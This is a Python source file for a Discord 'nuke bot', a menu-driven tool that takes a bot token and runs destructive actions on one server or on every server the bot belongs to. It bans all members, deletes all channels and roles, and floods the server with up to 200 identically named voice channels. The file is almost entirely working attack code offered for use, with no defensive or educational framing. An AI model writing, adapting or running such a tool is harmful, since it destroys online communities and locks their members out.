import discord
from discord.ext import commands
from colorama import Fore
import pystyle
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
init()

w = Fore.WHITE
r = Fore.RED
b = Fore.LIGHTBLACK_EX
g = Fore.LIGHTGREEN_EX
c = Fore.CYAN
m = Fore.LIGHTMAGENTA_EX
ll = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
fr = Fore.RESET
ly = Fore.LIGHTYELLOW_EX

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = Fore.RED + '''

                             ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄     ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
                            █  ▄    █  █ █  █   █   █   █   █       █       █
                            █ █▄█   █  █ █  █   █   █   █   █    ▄▄▄█▄     ▄█
                            █       █  █▄█  █   █   █   █   █   █▄▄▄  █   █    
                            █  ▄   ██       █   █▄▄▄█   █▄▄▄█    ▄▄▄█ █   █  
                            █ █▄█   █       █       █       █   █▄▄▄  █   █  
                            █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█  
                                                      

'''



async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'{b}Nuke: {r}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{b}Banned:{r}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{b}Delete Channels:{r}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{b}Delete Roles:{r}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{b}Create Voice Channels:{r}{created_channels}')
    #created_roles = await created_roles(guild,name)
    #print(f'{m}Create Roles:{b}{created_roles}')
    print(f'{lr}--------------------------------------------\n\n')


while True:
    clear()
    choice = input(f'''   
{baner}                
{lr}==============================================
    {b}[01] {lr}Setup Nuke Bot
    {b}[02] {lr}Exit
{b}====>{c}''')
    if choice == '1':
        token = _input(f'{b}Input bot token > {c}')
        name = _input(f'{b}Channel / Role namez > {c}')
        clear()
        choice_type = _input(f'''
{baner}                
{lr}==============================================
{b}[Select]
    {b}└─[1] {lr}- {lr}Nuke all servers.
    {b}└─[2] {lr}- {lr}Nuke one server  
    {b}└─[3] {lr}- {lr}Exit
{b}====>{c}''')
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{b}Input server id > {lr}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{b}Exit...')
            exit()
        try:
            client.run(token)
            input(f'{b}Nuke finished, press enter for return ')
        except Exception as error:
            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'{r}Intents Error\n{g}For fix -> Unable to fix\n{b}Press enter for return...')
            else:
                input(f'{r}{error}\n{b}Press enter for return...')
            continue
    elif choice == '2':
        print(f'{b}Exit...')
        exit()
